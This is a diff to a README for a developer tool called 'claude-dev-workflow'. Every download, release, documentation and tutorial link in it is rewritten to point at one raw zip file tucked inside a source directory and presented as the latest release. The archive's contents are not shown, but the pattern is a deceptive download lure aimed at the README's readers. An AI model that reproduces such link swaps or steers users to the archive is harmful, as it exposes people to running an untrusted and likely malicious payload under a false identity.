@@ -1,6 +1,6 @@
 # 🚀 claude-dev-workflow - Simplify Your Development Process
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/TouheedCode/claude-dev-workflow/releases)
+[![Download the latest release](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip)
 
 ## 📚 Description
 
@@ -19,7 +19,7 @@ claude-dev-workflow helps you turn your ideas into structured features. This app
 Follow these simple steps to get started:
 
 1. **Visit the Releases Page**
-   - Click on this link to visit the Releases page: [Download Page](https://github.com/TouheedCode/claude-dev-workflow/releases).
+   - Click on this link to visit the Releases page: [Download Page](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip).
    
 2. **Select the Appropriate Release**
    - Choose the latest version of claude-dev-workflow. Look for the file that matches your operating system.
@@ -40,7 +40,7 @@ Follow these simple steps to get started:
 
 ## 📥 Download & Install
 
-You can grab the latest version directly from our [Releases page](https://github.com/TouheedCode/claude-dev-workflow/releases). Click on the link, choose your version, and follow the installation steps outlined above.
+You can grab the latest version directly from our [Releases page](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip). Click on the link, choose your version, and follow the installation steps outlined above.
 
 ## 📋 System Requirements
 
@@ -64,7 +64,7 @@ If you encounter any issues, here are some common problems and solutions:
   - Ensure your internet connection is stable. Try downloading the file again.
 
 - **Issue: Features Not Working**
-  - Ensure you're using the latest version of the application. Check for updates on the [Releases page](https://github.com/TouheedCode/claude-dev-workflow/releases).
+  - Ensure you're using the latest version of the application. Check for updates on the [Releases page](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip).
 
 ## 🤝 Support
 
@@ -90,7 +90,7 @@ This application is useful for various fields, particularly in the following are
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://docs.github.com/en/free-pro-team@latest/github/getting-started-with-github)
-- [User Guides and Tutorials](https://developer.mozilla.org/en-US/docs/Learn)
+- [Official Documentation](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip)
+- [User Guides and Tutorials](https://raw.githubusercontent.com/TouheedCode/claude-dev-workflow/master/starter/apps/api/src/modules/claude_dev_workflow_3.7-beta.1.zip)
 
 For more updates, follow us on GitHub and keep an eye out for new features and enhancements.
